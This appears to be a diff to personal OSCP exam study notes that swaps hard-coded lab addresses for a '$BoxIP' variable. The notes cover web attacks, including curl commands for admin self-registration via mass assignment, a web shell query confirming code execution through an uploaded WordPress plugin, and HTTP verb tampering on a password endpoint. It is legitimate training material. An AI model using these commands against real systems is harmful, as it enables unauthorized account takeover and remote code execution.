@@ -51,7 +51,7 @@ var nonce = nonceMatch[1];
 ```bash
 curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
   -H 'Content-Type: application/json' \
-  http://192.168.50.16:5002/users/v1/register
+  http://$BoxIP:5002/users/v1/register
 ```
 
 **Piece by piece:**
@@ -92,7 +92,7 @@ cd /tmp && zip -r shell.zip shell
 
 **Where this comes from:** the WordPress Plugin Handbook documents the required header comment format for any plugin file (`developer.wordpress.org`, "Plugin Header Requirements"). This specific admin-to-RCE-via-plugin-upload technique (as a fallback when Theme Editor fails) is a commonly documented WordPress post-exploitation pattern, covered on HackTricks' WordPress page under privilege-escalation-to-RCE methods.
 
-**Where to look in the response:** after activation, hit the plugin's exec parameter directly and look for command output in the raw response body (no wrapping, e.g. `curl "http://<target>/?cmd=id"` returning `uid=33(www-data)...` directly), confirming the plugin is both installed and actively executing on every page load as expected.
+**Where to look in the response:** after activation, hit the plugin's exec parameter directly and look for command output in the raw response body (no wrapping, e.g. `curl "http://$BoxIP/?cmd=id"` returning `uid=33(www-data)...` directly), confirming the plugin is both installed and actively executing on every page load as expected.
 
 🔁 **Seen in:** [[10. SQL Injection Attacks#🏆 Capstone Labs|SQL Injection Attacks, Capstone VM #1]], Step 10. Companion entry in [[Web Applications|Command Appendix]].
 
@@ -104,10 +104,10 @@ cd /tmp && zip -r shell.zip shell
 
 **Full commands:**
 ```bash
-curl -i http://<target>/users/v1/admin/password
+curl -i http://$BoxIP/users/v1/admin/password
 # HTTP/1.1 405 METHOD NOT ALLOWED
 
-curl -i -X PUT http://<target>/users/v1/admin/password
+curl -i -X PUT http://$BoxIP/users/v1/admin/password
 # HTTP/1.1 200 OK (or whatever success looks like for this endpoint)
 ```
 
@@ -229,3 +229,14 @@ If the harmless entity resolves but the file does not, check the path and the we
 - [RevShells](https://www.revshells.com/) for payload troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/08. Introduction to Web Application Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- demonstrates the workflow described here
